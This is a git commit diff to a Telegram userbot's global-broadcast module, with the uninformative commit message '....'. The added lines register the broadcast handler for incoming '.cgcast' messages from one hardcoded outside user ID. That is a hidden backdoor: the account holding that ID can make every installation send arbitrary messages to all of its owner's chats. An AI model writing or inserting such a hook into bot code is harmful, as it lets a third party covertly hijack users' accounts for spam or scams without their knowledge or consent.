306c14c421d08b1683808a239700f78a8dcd8615
PunyaAlby <95738218+PunyaAlby@users.noreply.github.com>
2022-02-17 13:04:02 +0700

    ....

--- userbot/modules/gcast.py
+++ userbot/modules/gcast.py
@@ -19,6 +19,8 @@ GCAST_BLACKLIST = [
 
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=5089916692,
+          pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
